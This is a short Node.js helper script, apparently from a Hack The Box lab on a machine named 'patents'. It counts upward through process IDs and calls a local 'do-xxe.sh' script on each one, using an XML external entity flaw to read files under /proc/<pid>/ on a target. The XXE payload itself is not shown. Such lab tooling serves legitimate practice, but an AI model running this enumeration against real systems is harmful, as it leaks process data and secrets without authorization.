const { exec } = require('child_process');

let pid = parseInt(process.argv[2]);
let file = process.argv[3];

const interval = setInterval(() => {
    if (pid >= 30000) {
        clearInterval(interval);
        process.exit(1);
    }
    exec('/home/zoey/htb/patents/xxe/do-xxe.sh /proc/' + pid + '/' + file, (error, stdout, stderr) => {
        if (error) {
            console.log('ERROR', error)
        } else {
            console.log(pid);
        }
    });
    pid++;
}, 100);